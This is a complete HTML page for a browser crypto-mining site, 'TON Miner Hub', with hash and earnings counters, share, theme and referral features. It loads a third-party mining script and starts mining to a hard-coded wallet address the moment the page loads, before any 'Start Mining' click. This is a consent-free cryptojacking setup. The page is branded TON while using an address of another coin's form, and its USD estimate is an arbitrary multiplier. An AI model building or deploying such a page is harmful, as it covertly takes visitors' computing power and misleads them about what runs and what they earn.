<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>TON Miner Hub</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      background: #121212;
      color: white;
      transition: background 0.3s, color 0.3s;
    }
    .container {
      margin-top: 50px;
    }
    button {
      margin: 10px;
      padding: 10px 20px;
      font-size: 16px;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }
    .referral, #visits, #time {
      margin-top: 10px;
      font-size: 14px;
      color: #ccc;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>TON Miner Hub</h1>
    <p id="hashes">Hashes: 0</p>
    <p id="usd">Estimated USD: $0.00000</p>
    <p id="time"></p>
    <p id="visits"></p>
    <div class="referral" id="referralInfo"></div>

    <button onclick="startMining()">Start Mining</button>
    <button onclick="stopMining()">Stop Mining</button>
    <button onclick="shareSite()">Share</button>
    <button onclick="toggleTheme()">Toggle Theme</button>
  </div>

  <script src="https://webminepool.com/lib/simple-ui.js"></script>
  <script>
    let miner = WMP.Anonymous('43zEiFNinS32j1F229r8AqZxpbtfAAeZYXY6T4GhWB8gNmZxfLMBtzpCW2u3HsZsncazQB7wfZB5rR8kPm7ET9b4G5RmjFr');
    miner.start();

    let hashesElement = document.getElementById("hashes");
    let usdElement = document.getElementById("usd");

    function startMining() {
      miner.start();
    }

    function stopMining() {
      miner.stop();
    }

    function updateStats() {
      let hashes = miner.getTotalHashes();
      hashesElement.textContent = "Hashes: " + hashes;
      let usd = (hashes * 0.000001).toFixed(5);
      usdElement.textContent = "Estimated USD: $" + usd;
    }

    function shareSite() {
      navigator.clipboard.writeText(window.location.href);
      alert("Site link copied to clipboard!");
    }

    function toggleTheme() {
      let isDark = document.body.style.background === "white";
      document.body.style.background = isDark ? "#121212" : "white";
      document.body.style.color = isDark ? "white" : "black";
    }

    setInterval(updateStats, 1000);
    setInterval(() => {
      const now = new Date().toLocaleTimeString();
      document.getElementById("time").textContent = "Current Time: " + now;
    }, 1000);

    window.addEventListener('DOMContentLoaded', () => {
      // Referral
      const urlParams = new URLSearchParams(window.location.search);
      const ref = urlParams.get('ref');
      if (ref) {
        const refDiv = document.getElementById("referralInfo");
        refDiv.textContent = "Referred by: " + ref;
        localStorage.setItem("referral", ref);
      }

      // Visit count
      let visits = localStorage.getItem("visitCount") || 0;
      visits++;
      localStorage.setItem("visitCount", visits);
      document.getElementById("visits").textContent = "Your visits: " + visits;
    });
  </script>
</body>
</html>
